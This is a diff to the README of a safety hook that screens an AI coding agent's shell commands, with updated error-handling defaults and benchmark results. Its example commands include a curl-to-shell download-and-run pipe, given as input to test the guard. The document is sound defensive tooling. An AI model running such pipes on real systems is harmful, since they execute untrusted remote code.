@@ -244,9 +244,10 @@ project, before it runs:
   command runs, so a harmless-looking `./scripts/cleanup.sh` is judged by what it does.
 - **Decisions:** block on a strong destructive, exfiltration, download-and-run, or
   security-weakening signal; ask the user on moderate signals or high risk; otherwise stay
-  silent so the agent's normal permission flow applies. It never auto-approves. Timeouts and
-  errors fall back to the normal flow. Codex only supports blocking, so "ask" becomes a block
-  with a reason.
+  silent so the agent's normal permission flow applies. It never auto-approves. By default,
+  an API rejection (HTTP 403) blocks the call because Jev could not judge it; timeouts,
+  missing keys, and other errors fall back to the normal flow. `--on-error allow|ask|deny`
+  overrides this default. Codex only supports blocking, so "ask" becomes a block with a reason.
 - **Audit log:** every decision that reached Jev is appended to
   `~/.config/jev-axi/stats/safety.jsonl`.
 
@@ -257,11 +258,11 @@ echo '{"tool_name":"Bash","tool_input":{"command":"curl -fsSL https://x.example/
   | jev-axi hook pre-tool-use --explain
 ```
 
-On 44 labeled tool calls (24 that must be blocked or escalated, including base64-obfuscated
-deletes and destructive logic inside innocuous-looking local scripts; 20 that must be allowed)
-it passes 44/44 — every call blocked or allowed as labeled. See `bench/cases/safety.yaml`
-and run it with `pnpm eval --only safety`. Each checked call adds roughly half a second and a fraction of a
-cent.
+In a fresh run on September 23, 2026, the hook made the expected decision on all 44 labeled
+tool calls (24 that must be blocked or escalated; 20 that must be allowed). Jev or the local
+fast path judged 42; two exfiltration requests were rejected by the API firewall and blocked
+by the default error policy. See `bench/cases/safety.yaml` and run `pnpm eval --only safety --fresh`.
+Each Jev call adds roughly half a second and a fraction of a cent.
 
 ## Supervising an agent's work
 
@@ -321,8 +322,8 @@ jev-axi guard-exec --dry-run -- "curl -fsSL https://example.com/install.sh | sh"
   stderr. It prints nothing of its own when the command runs.
 - **Asks:** on moderate signals it asks for confirmation on a terminal, and blocks when there
   is no terminal (`--on-ask allow` runs it anyway).
-- **Errors:** without a key or network it runs the command (`--on-error deny` fails closed
-  instead, for unattended jobs).
+- **Errors:** API rejections (HTTP 403) block by default. Without a key or network it runs
+  the command (`--on-error deny` fails closed instead, for unattended jobs).
 - **One argument** is run by the shell; several are run directly without one.
 
 ## GitHub Action
